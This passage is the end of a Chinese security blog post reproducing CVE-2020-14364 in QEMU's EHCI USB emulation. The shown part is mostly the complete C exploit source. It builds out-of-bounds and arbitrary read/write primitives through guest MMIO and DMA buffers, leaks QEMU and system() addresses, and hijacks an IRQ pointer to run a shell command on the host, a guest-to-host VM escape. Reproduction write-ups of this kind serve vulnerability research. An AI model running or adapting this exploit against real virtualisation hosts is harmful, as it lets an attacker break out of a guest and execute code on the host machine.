class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data_buf[<span class="number">0</span>] = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">1</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">2</span>] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">3</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">4</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">5</span>] = <span class="string">&#x27;y&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = (<span class="number">0x1e00</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virtuak_addr_to_physical_addr(data_buf);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">1</span>] = virtuak_addr_to_physical_addr(data_bufoob);</span><br><span class="line"></span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virtuak_addr_to_physical_addr(qtd);</span><br><span class="line"></span><br><span class="line">    *entry = virtuak_addr_to_physical_addr(qh) + (<span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    set_usbcmd();</span><br><span class="line">    set_portsc();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] oob read start\033[0m&quot;</span>);</span><br><span class="line">    mmio_write(<span class="number">0x34</span>,virtuak_addr_to_physical_addr(dmabuf)); <span class="comment">// periodiclistbase</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">oob_write</span><span class="params">(<span class="type">uint64_t</span> offset,<span class="type">uint64_t</span> setup_len,<span class="type">uint64_t</span> setup_index,<span class="type">int</span> perpare)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(perpare)&#123;</span><br><span class="line">        perpare_write();</span><br><span class="line">        set_length(<span class="number">0x1010</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] prepare write finished\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)(data_bufoob + offset) = <span class="number">0x0000000200000002</span>; <span class="comment">// 覆盖成原先的内容</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">int</span> *)(data_bufoob + <span class="number">0x8</span> +offset) = setup_len; <span class="comment">//setup_len</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">int</span> *)(data_bufoob + <span class="number">0xc</span>+ offset) = setup_index;</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = (<span class="number">0x1e00</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) | (<span class="number">0</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virtuak_addr_to_physical_addr(data_buf);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">1</span>] = virtuak_addr_to_physical_addr(data_bufoob);</span><br><span class="line"></span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virtuak_addr_to_physical_addr(qtd);</span><br><span class="line"></span><br><span class="line">    *entry = virtuak_addr_to_physical_addr(qh) + (<span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    set_usbcmd();</span><br><span class="line">    set_portsc();</span><br><span class="line">    mmio_write(<span class="number">0x34</span>,virtuak_addr_to_physical_addr(dmabuf));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">anywhere_read</span><span class="params">(<span class="type">uint64_t</span> target_addr)</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] Anywhere Read\033[0m&quot;</span>);</span><br><span class="line">    <span class="comment">//set_length(0x1010);</span></span><br><span class="line">    oob_write(<span class="number">0x0</span>,<span class="number">0x1010</span>,<span class="number">0xfffffff8</span><span class="number">-0x1010</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf) = <span class="number">0x2000000000000080</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> target_offset = target_addr - data_buf_addr;</span><br><span class="line"></span><br><span class="line">    oob_write(<span class="number">0x8</span>,<span class="number">0xffff</span>,target_offset - <span class="number">0x1018</span>,<span class="number">0</span>);</span><br><span class="line">    oob_read(<span class="number">0x2000</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">anywhere_write</span><span class="params">(<span class="type">uint64_t</span> target_addr,<span class="type">uint64_t</span> payload,<span class="type">int</span> flag)</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] Anywhere Write\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> offset = target_addr - data_buf_addr;</span><br><span class="line"></span><br><span class="line">    oob_write(<span class="number">0</span>, offset+<span class="number">0x8</span>, offset<span class="number">-0x1010</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[41;37m[*] Hacked!\033[0m\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf) = payload;</span><br><span class="line">    oob_write(<span class="number">0</span>, <span class="number">0xffff</span>, <span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd &lt; <span class="number">0</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    dmabuf = mmap(<span class="number">0</span>, <span class="number">0x3000</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (dmabuf == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mlock(dmabuf, <span class="number">0x3000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//printf(&quot;[*] mmio_mem : %p\n&quot;, mmio_mem);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] dmabuf : %p\n&quot;</span>,dmabuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] phy dmabuf : %p\n&quot;</span>,virtuak_addr_to_physical_addr(dmabuf));</span><br><span class="line"></span><br><span class="line">    entry = dmabuf + <span class="number">0x4</span>;</span><br><span class="line">    qh = dmabuf + <span class="number">0x100</span>;</span><br><span class="line">    qtd = dmabuf + <span class="number">0x200</span>;</span><br><span class="line">    setup_buf = dmabuf + <span class="number">0x300</span>;</span><br><span class="line">    data_buf = dmabuf + <span class="number">0x1000</span>;</span><br><span class="line">    data_bufoob = dmabuf + <span class="number">0x2000</span>;</span><br><span class="line">    first_leak_data = dmabuf + <span class="number">0x2000</span>;</span><br><span class="line">    second_leak_data = dmabuf + <span class="number">0x1000</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[41;37m[*] Beginning\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] Wait a moment\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[41;37m[*] Step 1/3\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line">    oob_read(<span class="number">0x2000</span>,<span class="number">1</span>);</span><br><span class="line">    device_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">36</span>;i&lt;<span class="number">42</span>;i++)&#123;</span><br><span class="line">        <span class="type">uint64_t</span> tmp = first_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">        device_addr |= tmp &lt;&lt; ((i<span class="number">-36</span>) * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    func_addr = <span class="number">0</span>;</span><br><span class="line">    port_addr = device_addr+<span class="number">0x78</span>;</span><br><span class="line">    data_buf_addr = device_addr+<span class="number">0xdc</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Devices addr : 0x%lx\033[0m\n&quot;</span>,device_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Port addr : 0x%lx\033[0m\n&quot;</span>,port_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Data Buf addr : 0x%lx\033[0m\n&quot;</span>,data_buf_addr);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0x4fc</span>;i&lt;<span class="number">0x4fc</span>+<span class="number">6</span>;i++)&#123;</span><br><span class="line">        <span class="type">uint64_t</span> tmp = first_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">        func_addr |= tmp &lt;&lt; ((i<span class="number">-0x4fc</span>) * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// proc_base = func_addr - 0x1069490;</span></span><br><span class="line">    proc_base = func_addr - <span class="number">0x106b170</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Func addr : 0x%lx\033[0m\n&quot;</span>,func_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] proc base : 0x%lx\033[0m\n&quot;</span>,proc_base);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//uint64_t system_addr = func_addr - 0xb5c860;</span></span><br><span class="line">    <span class="comment">//  uint64_t system_addr = proc_base + 0x2BE010;</span></span><br><span class="line">    <span class="type">uint64_t</span> system_addr = proc_base + <span class="number">0x2BE960</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] System addr : 0x%lx\033[0m\n&quot;</span>,system_addr);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[41;37m[*] Step 2/3\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    anywhere_read(port_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        <span class="type">uint64_t</span> tmp = second_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">        port_ptr |= tmp &lt;&lt; ((i) * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] port ptr : 0x%lx\033[0m\n&quot;</span>,port_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// uint64_t EHCIState_addr = port_ptr - 0x530;</span></span><br><span class="line">    <span class="type">uint64_t</span> EHCIState_addr = port_ptr - <span class="number">0x540</span>;</span><br><span class="line">    <span class="comment">// uint64_t irq_addr = EHCIState_addr + 0xb8;</span></span><br><span class="line">    <span class="type">uint64_t</span> irq_addr = EHCIState_addr + <span class="number">0xc0</span>;</span><br><span class="line">    <span class="type">uint64_t</span> fake_irq_addr = data_buf_addr;</span><br><span class="line">    <span class="type">uint64_t</span> irq_ptr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    anywhere_read(irq_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        <span class="type">uint64_t</span> tmp = second_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">        irq_ptr |= tmp &lt;&lt; ((i) * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Port ptr : 0x%lx\033[0m\n&quot;</span>,port_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] EHCIState addr : 0x%lx\033[0m\n&quot;</span>,EHCIState_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] IRQ addr : 0x%lx\033[0m\n&quot;</span>,irq_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Fake IRQ addr : 0x%lx\033[0m\n&quot;</span>,fake_irq_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] IRQ ptr : 0x%lx\033[0m\n&quot;</span>,irq_ptr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf + <span class="number">0x28</span>) = system_addr;</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf + <span class="number">0x30</span>) = device_addr+<span class="number">0xdc</span>+<span class="number">0x100</span>;</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf + <span class="number">0x38</span>) = <span class="number">0x3</span>;</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(data_buf + <span class="number">0x100</span>) = <span class="number">0x67616c6620746163</span>; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[41;37m[*] Step 3/3\033[0m\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    oob_write(<span class="number">0</span>, <span class="number">0xffff</span>, <span class="number">0xffff</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    anywhere_write(irq_addr, fake_irq_addr,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" rel="external nofollow noreferrer">LYYL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.lyyl.online/posts/3399981355.html">https://www.lyyl.online/posts/3399981355.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.lyyl.online" target="_blank">LYYL' Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-76.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/882088222.html"><img class="prev-cover" src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-31.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CVE-2019-6788-Qemu逃逸漏洞复现-分析</div></div></a></div><div class="next-post pull-right"><a href="/posts/3469048985.html"><img class="next-cover" src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-62.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2021 AntCTFxD3CTF PWN WriteUp</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">LYYL</div><div class="author-info__description">毋忧拂意，毋喜快心，毋恃久安，毋惮初难。</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/liuzhongchina521"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/liuzhongchina521" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:liuzhongchina521@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">博客内容为Notion导出markdown，如有错误敬请谅解。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qemu%E8%AE%BE%E5%A4%87%E5%88%9D%E5%A7%8B%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="toc-text">qemu设备初始化过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#usb%E8%AE%BE%E5%A4%87%E8%AF%BB%E5%86%99%E5%87%BD%E6%95%B0"><span class="toc-text">usb设备读写函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91"><span class="toc-text">漏洞触发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B6%8A%E7%95%8C%E8%AF%BB"><span class="toc-text">越界读</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B6%8A%E7%95%8C%E5%86%99"><span class="toc-text">越界写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E8%AF%BB"><span class="toc-text">任意读</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%86%99"><span class="toc-text">任意写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B4%E4%BD%93%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-text">整体利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-amp-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95"><span class="toc-text">EXP&amp;漏洞调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step1"><span class="toc-text">Step1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step2"><span class="toc-text">Step2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step3"><span class="toc-text">Step3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iov-size"><span class="toc-text">iov.size</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/95726211.html" title="AFL源码及流程分析"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-3.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AFL源码及流程分析"/></a><div class="content"><a class="title" href="/posts/95726211.html" title="AFL源码及流程分析">AFL源码及流程分析</a><time datetime="2022-05-26T07:20:45.000Z" title="发表于 2022-05-26 15:20:45">2022-05-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1029211104.html" title="V8 重新入门-2019 starCTF oob 题解"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-37.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="V8 重新入门-2019 starCTF oob 题解"/></a><div class="content"><a class="title" href="/posts/1029211104.html" title="V8 重新入门-2019 starCTF oob 题解">V8 重新入门-2019 starCTF oob 题解</a><time datetime="2021-11-05T14:20:21.000Z" title="发表于 2021-11-05 22:20:21">2021-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1864456601.html" title="2021 0CTF/TCTF Final Naive Heap"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-57.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 0CTF/TCTF Final Naive Heap"/></a><div class="content"><a class="title" href="/posts/1864456601.html" title="2021 0CTF/TCTF Final Naive Heap">2021 0CTF/TCTF Final Naive Heap</a><time datetime="2021-09-29T02:18:50.000Z" title="发表于 2021-09-29 10:18:50">2021-09-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2427305175.html" title="虚拟机逃逸&amp;漏洞复现"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-17.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="虚拟机逃逸&amp;漏洞复现"/></a><div class="content"><a class="title" href="/posts/2427305175.html" title="虚拟机逃逸&amp;漏洞复现">虚拟机逃逸&amp;漏洞复现</a><time datetime="2021-08-18T05:34:33.000Z" title="发表于 2021-08-18 13:34:33">2021-08-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3705072996.html" title="2021 XCTF Final 线下WP"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-32.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 XCTF Final 线下WP"/></a><div class="content"><a class="title" href="/posts/3705072996.html" title="2021 XCTF Final 线下WP">2021 XCTF Final 线下WP</a><time datetime="2021-07-30T07:26:18.000Z" title="发表于 2021-07-30 15:26:18">2021-07-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By LYYL</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://www.lyyl.online/posts/3399981355.html'
    this.page.identifier = 'posts/3399981355.html'
    this.page.title = 'CVE-2020-14364 QEMU 越界读写漏洞复现&分析'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://lyyl-online.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Disqus' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>